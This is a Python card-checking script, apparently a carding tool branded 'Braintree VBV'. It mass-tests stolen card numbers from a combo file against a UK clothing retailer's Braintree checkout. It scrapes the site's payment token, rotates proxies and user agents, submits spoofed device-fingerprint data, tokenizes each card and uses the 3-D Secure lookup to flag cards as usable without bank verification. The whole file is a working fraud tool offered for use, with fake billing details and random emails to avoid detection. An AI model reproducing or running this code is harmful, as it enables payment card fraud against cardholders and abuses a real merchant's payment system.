import requests
import os
import re
import random
import string
import time
import json
import base64
import uuid
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import jwt
import shutil
from cfonts import render
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

used_emails = set()

def get_rotating_user_agent():
    desktop_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
    ]
    return random.choice(desktop_agents)

def generate_random_email():
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    unique_id = str(uuid.uuid4())[:8]
    email = f'{random_part}_{unique_id}_{timestamp}@gmail.com'
    
    if email not in used_emails:
        used_emails.add(email)
        return email
    else:
        return generate_random_email()

def parse_proxy(proxy_str):
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def load_proxies():
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def load_cards():
    if os.path.exists('cards.txt'):
        with open('cards.txt', 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        return cards
    return []

def get_bin_info(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def setup_session(proxy_str=None):
    r = requests.Session()
    
    # Setup retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504, 429],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    r.mount("https://", adapter)
    r.mount("http://", adapter)
    
    # Set proxies if provided
    if proxy_str:
        proxies = parse_proxy(proxy_str)
        if proxies:
            r.proxies.update(proxies)
    
    return r

def extract_auth_token(html_content):
    soup = BeautifulSoup(html_content, "html.parser")
    scripts = soup.find_all('script')
    auth_token = None
    for script in scripts:
        if script.string and 'braintree.client.create' in script.string:
            match = re.search(r"authorization:\s*'([^']+)'", script.string)
            if match:
                auth_token = match.group(1)
                break
    return auth_token

def check_card_vbv(cc_line):
    start_time = time.time()
    max_retries = 2
    
    for attempt in range(max_retries):
        try:
            # Parse card details
            if '|' in cc_line:
                parts = cc_line.strip().split('|')
                if len(parts) >= 4:
                    n = parts[0].strip()
                    mm = parts[1].strip()
                    yy = parts[2].strip()
                    cvc = parts[3].strip()
                else:
                    elapsed_time = time.time() - start_time
                    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Format month and year
            if int(mm) in [12, 11, 10]:
                mm = mm
            elif '0' not in mm:
                mm = f'0{mm}'
            
            if len(yy) == 4:
                yy = yy[2:]
            
            # Get BIN info
            bin_info = get_bin_info(n[:6])
            
            # Load proxies
            proxies_list = load_proxies()
            if not proxies_list:
                proxy_str = None
            else:
                proxy_str = random.choice(proxies_list)
            
            # Setup session with proxy
            r = setup_session(proxy_str)
            user_agent = get_rotating_user_agent()
            
            # Step 1: Get initial cookies and auth token
            cookies = {
                'ASP.NET_SessionId': '5hdglzbdg2bz5tlghowdp1b2',
                'country': '243',
                'currency': '1',
                '_ga_RRSFXGTKBX': 'GS2.1.s1749745525$o2$g1$t1749745548$j37$l0$h0',
                '_ga': 'GA1.3.394504296.1749741341',
                '_gid': 'GA1.3.750300930.1749741341',
                '_fbp': 'fb.2.1749741341264.860241298449961425',
                '_ga_SDE2X44STD': 'GS2.3.s1749745526$o2$g1$t1749745548$j38$l0$h0',
                'EcomBase': 'basketid=77437',
            }
            
            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i',
            }
            
            response = r.get('https://www.redoakwear.co.uk/checkout/', cookies=cookies, headers=headers, timeout=30, verify=False)
            
            # Extract auth token
            auth_token = extract_auth_token(response.content)
            if not auth_token:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Authorization token not found ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Decode auth token
            try:
                decoded = base64.b64decode(auth_token).decode('utf-8')
                au = gets(decoded, '"authorizationFingerprint":"', '"')
                merchantId = gets(decoded, '"merchantId":"', '"')
            except Exception as e:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Error decoding auth token ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Step 2: Get cardinal authentication JWT
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://www.redoakwear.co.uk',
                'priority': 'u=1, i',
                'referer': 'https://www.redoakwear.co.uk/',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user_agent,
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '1f91f2a3-11e7-45a3-a0da-da39f0b1c70e',
                },
                'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
                'operationName': 'ClientConfiguration',
            }
            
            response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30, verify=False)
            paxx12 = gets(response.text, '"cardinalAuthenticationJWT":"', '"')
            
            # Step 3: Initialize Cardinal order
            headers = {
                'User-Agent': user_agent,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/json;charset=UTF-8',
                'X-Cardinal-Tid': 'Tid-512cdf1f-4b34-40fe-838d-2469a60ffdfd',
                'Origin': 'https://www.redoakwear.co.uk',
                'Connection': 'keep-alive',
                'Referer': 'https://www.redoakwear.co.uk/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
            }
            
            json_data = {
                'BrowserPayload': {
                    'Order': {
                        'OrderDetails': {},
                        'Consumer': {
                            'BillingAddress': {},
                            'ShippingAddress': {},
                            'Account': {},
                        },
                        'Cart': [],
                        'Token': {},
                        'Authorization': {},
                        'Options': {},
                        'CCAExtension': {},
                    },
                    'SupportsAlternativePayments': {
                        'cca': True,
                        'hostedFields': False,
                        'applepay': False,
                        'discoverwallet': False,
                        'wallet': False,
                        'paypal': False,
                        'visacheckout': False,
                    },
                },
                'Client': {
                    'Agent': 'SongbirdJS',
                    'Version': '1.35.0',
                },
                'ConsumerSessionId': '0_3fce9598-32ba-4d20-9f1e-bf83e3b96c49',
                'ServerJWT': paxx12,
            }
            
            response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data, timeout=30, verify=False)
            payload = response.json()['CardinalJWT']
            payload_dict = jwt.decode(payload, options={"verify_signature": False})
            df = payload_dict['ReferenceId']
            
            # Step 4: Save browser data for fingerprinting
            headers = {
                'User-Agent': user_agent,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://geo.cardinalcommerce.com',
                'Connection': 'keep-alive',
                'Referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true^&alias=Default^&orgUnitId=5c8a9f5c791eef31e8318cab^&tmEventType=PAYMENT^&referenceId=0_3fce9598-32ba-4d20-9f1e-bf83e3b96c49^&geolocation=false^&origin=Songbird',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            }
            
            json_data = {
                'Cookies': {
                    'Legacy': True,
                    'LocalStorage': True,
                    'SessionStorage': True,
                },
                'DeviceChannel': 'Browser',
                'Extended': {
                    'Browser': {
                        'Adblock': False,
                        'AvailableJsFonts': [
                            'Arial', 'Arial Black', 'Calibri', 'Cambria', 'Cambria Math', 'Comic Sans MS',
                            'Consolas', 'Courier', 'Courier New', 'Georgia', 'Helvetica', 'Impact',
                            'Lucida Console', 'Lucida Sans Unicode', 'Microsoft Sans Serif', 'MS Gothic',
                            'MS PGothic', 'MS Sans Serif', 'MS Serif', 'Palatino Linotype', 'Segoe Print',
                            'Segoe Script', 'Segoe UI', 'Segoe UI Light', 'Segoe UI Semibold', 'Segoe UI Symbol',
                            'Tahoma', 'Times', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Wingdings',
                        ],
                        'DoNotTrack': 'unspecified',
                        'JavaEnabled': False,
                    },
                    'Device': {
                        'ColorDepth': 24,
                        'Cpu': 'unknown',
                        'Platform': 'Win32',
                        'TouchSupport': {
                            'MaxTouchPoints': 0,
                            'OnTouchStartAvailable': False,
                            'TouchEventCreationSuccessful': False,
                        },
                    },
                },
                'Fingerprint': 'e56b736dc52548e2aa56932fb3af7659',
                'FingerprintingTime': 83,
                'FingerprintDetails': {
                    'Version': '1.5.1',
                },
                'Language': 'en-US',
                'Latitude': None,
                'Longitude': None,
                'OrgUnitId': '5c8a9f5c791eef31e8318cab',
                'Origin': 'Songbird',
                'Plugins': [
                    'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                ],
                'ReferenceId': df,
                'Referrer': 'https://www.redoakwear.co.uk/',
                'Screen': {
                    'FakedResolution': False,
                    'Ratio': 1.7777777777777777,
                    'Resolution': '1920x1080',
                    'UsableResolution': '1920x1040',
                    'CCAScreenSize': '01',
                },
                'CallSignEnabled': None,
                'ThreatMetrixEnabled': False,
                'ThreatMetrixEventType': 'PAYMENT',
                'ThreatMetrixAlias': 'Default',
                'TimeOffset': -180,
                'UserAgent': user_agent,
                'UserAgentDetails': {
                    'FakedOS': False,
                    'FakedBrowser': False,
                },
                'BinSessionId': 'ad013c41-ef2c-400a-9110-eed6ad116bff',
            }
            
            r.post(
                'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
                cookies=cookies,
                headers=headers,
                json=json_data,
                timeout=30,
                verify=False
            )
            
            # Step 5: Tokenize credit card
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user_agent,
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '1f91f2a3-11e7-45a3-a0da-da39f0b1c70e',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            resp = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30, verify=False)
            
            if 'data' not in resp.json() or 'tokenizeCreditCard' not in resp.json()['data']:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Card tokenization failed ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            token1 = resp.json()['data']['tokenizeCreditCard']['token']
            
            # Step 6: Perform 3D Secure lookup
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                'origin': 'https://www.redoakwear.co.uk',
                'priority': 'u=1, i',
                'referer': 'https://www.redoakwear.co.uk/',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user_agent,
            }
            
            json_data = {
                'amount': '40.90',
                'additionalInfo': {
                    'billingLine1': 'No 9 Ganob 10080',
                    'billingLine2': "Jam'iyyat Ahmad Orabi",
                    'billingCity': 'Qism al-Obour',
                    'billingPostalCode': '10080',
                    'billingCountryCode': 'US',
                    'billingPhoneNumber': '325235',
                    'billingGivenName': 'fsaasf',
                    'billingSurname': 'fasfs',
                    'email': generate_random_email(),
                },
                'bin': n[:6],
                'dfReferenceId': df,
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.85.2',
                    'cardinalDeviceDataCollectionTimeElapsed': 7,
                    'issuerDeviceDataCollectionTimeElapsed': 588,
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': au,
                'braintreeLibraryVersion': 'braintree/web/3.85.2',
                '_meta': {
                    'merchantAppId': 'www.redoakwear.co.uk',
                    'platform': 'web',
                    'sdkVersion': '3.85.2',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': '1f91f2a3-11e7-45a3-a0da-da39f0b1c70e',
                },
            }
            
            response = r.post(
                f'https://api.braintreegateway.com/merchants/{merchantId}/client_api/v1/payment_methods/{token1}/three_d_secure/lookup',
                headers=headers,
                json=json_data,
                timeout=30,
                verify=False
            )
            
            # Extract response data
            response_json = response.json()
            issuingBank = gets(response.text, '"issuingBank":"', '","')
            cardType = gets(response.text, '"cardType":"', '","')
            
            if not issuingBank:
                issuingBank = bin_info['bank']
            if not cardType:
                cardType = bin_info['brand']
            
            status_raw = response_json.get('paymentMethod', {}).get('threeDSecureInfo', {}).get('status', 'Unknown')
            res = status_raw.replace('_', ' ').title()
            
            elapsed_time = time.time() - start_time
            
            # Determine status and format response with EXACT FORMATTING YOU WANT
            if 'Successful' in res:
                status = "APPROVED CC ✅"
                response_emoji = "✅"
                vbv_status = "[NON - VBV CC ✅]"
            elif "Challenge Required" in res:
                status = "APPROVED CC ✅"
                response_emoji = "❌"
                vbv_status = "[VBV CC ❌]"
            elif "Frictionless Failed" in res:
                status = "DECLINED CC ❌"
                response_emoji = "❌"
                vbv_status = "[VBV CC ❌]"
            elif "Failed" in res:
                status = "DECLINED CC ❌"
                response_emoji = "❌"
                vbv_status = "[VBV CC ❌]"
            elif "Rejected" in res:
                status = "DECLINED CC ❌"
                response_emoji = "❌"
                vbv_status = "[VBV CC ❌]"
            else:
                status = "DECLINED CC ❌"
                response_emoji = "❌"
                vbv_status = "[NON - VBV CC ❌]"
            
            return f"""
{status}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res} {response_emoji}| {vbv_status}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {issuingBank}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError):
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {max_retries} retries
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)} ❌ | [NON - VBV CC ❌]
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    # This return statement is outside the for loop
    elapsed_time = time.time() - start_time
    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Max retries exceeded
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree VBV  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_vbv(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_vbv(cc_line)
        results.append(result)
        time.sleep(1)  # Delay between checks
    return results

if __name__ == "__main__":
    # Show banner
    text = "zxr"
    font = render(text, colors=['black', 'red'], align='center')
    print(font)
    print('\033[2;32m' + ' With Out .txt')
    print('\033[2;33m')
    
    start_time = time.time()
    
    filename = input('\033[1;31m' + " Combo File : " ) 
    filename_with_extension = filename + '.txt'
    
    if not os.path.exists(filename_with_extension):
        print(f"Error: File {filename_with_extension} not found!")
        exit()
    
    with open(filename_with_extension, "r") as file:
        cards = [line.strip() for line in file if line.strip()]
    
    print('\033[1;33m' + ' ═════════════════════════════════  ')
    token = input('\033[1;34m' + ' (1) Token : ' + '\033[2;31m')
    print('\033[1;33m' + ' ═════════════')
    ID = input('\033[1;34m' + ' (2)  ID   : ' + '\033[2;31m')
    
    # Show user agent
    user = get_rotating_user_agent()
    columns = shutil.get_terminal_size().columns
    print(user.center(columns))
    
    # Start checking cards
    results = check_cards_vbv(cards)
    
    # Print all results
    for result in results:
        print(result)
